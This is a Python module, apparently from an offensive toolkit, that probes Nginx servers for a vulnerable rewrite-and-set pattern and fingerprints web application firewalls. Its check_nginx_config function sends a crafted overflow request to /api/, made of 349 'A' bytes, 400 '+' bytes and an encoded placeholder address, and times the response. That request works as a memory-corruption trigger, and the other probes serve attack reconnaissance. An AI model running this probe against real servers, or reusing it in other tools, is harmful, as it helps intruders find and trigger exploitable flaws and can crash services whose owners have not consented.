"""
recon/nginx_config.py — Nginx config probing and WAF detection.
"""
from __future__ import annotations

import socket
import time

from config import WAF_SIGNATURES
from core.spray import wrap_if_ssl, addr_to_uri_bytes


def check_nginx_config(host: str, port: int, vhost: str = "l",
                       use_ssl: bool = False) -> dict:
    """Probe for vulnerable rewrite+set pattern (cipherspy style)."""
    result: dict = {"endpoints": {}, "vuln_pattern": False}

    endpoints = ["/", "/api/test", "/spray"]
    for ep in endpoints:
        try:
            sock = socket.create_connection((host, port), timeout=3)
            with wrap_if_ssl(sock, host, use_ssl) as s:
                s.sendall(
                    f"GET {ep} HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode()
                )
                data = s.recv(512)
                status = data.split(b"\r\n", 1)[0].decode("latin-1", "replace")
                result["endpoints"][ep] = status
        except OSError as e:
            result["endpoints"][ep] = f"error: {e}"

    safe_addr = 0x414141414141
    uri = (b"A" * 349) + (b"+" * 400) + addr_to_uri_bytes(safe_addr)
    try:
        sock = socket.create_connection((host, port), timeout=3)
        with wrap_if_ssl(sock, host, use_ssl) as s:
            t0 = time.monotonic()
            s.sendall(
                b"GET /api/" + uri + b" HTTP/1.1\r\nHost:" +
                vhost.encode() + b"\r\nConnection:close\r\n\r\n"
            )
            resp = s.recv(256)
            elapsed = time.monotonic() - t0
            result["overflow_probe"] = {
                "elapsed_s": round(elapsed, 3),
                "response": resp.split(b"\r\n", 1)[0].decode("latin-1", "replace"),
            }
    except OSError as e:
        result["overflow_probe"] = {"error": str(e)}

    for ep, status in result["endpoints"].items():
        if "/api" in ep and "200" in status:
            result["vuln_pattern"] = True

    return result


def detect_waf(host: str, port: int, vhost: str = "l",
               use_ssl: bool = False) -> list[str]:
    """Detect WAF by response analysis (MateusVerass style)."""
    detected: list[str] = []
    try:
        sock = socket.create_connection((host, port), timeout=3)
        with wrap_if_ssl(sock, host, use_ssl) as s:
            s.sendall(f"GET / HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode())
            data = s.recv(4096)
            headers = data.decode("latin-1", errors="replace").lower()
            for waf_name, sig in WAF_SIGNATURES.items():
                for h in sig["headers"]:
                    if h.lower() in headers:
                        detected.append(waf_name)
                        break
    except OSError:
        pass
    return detected
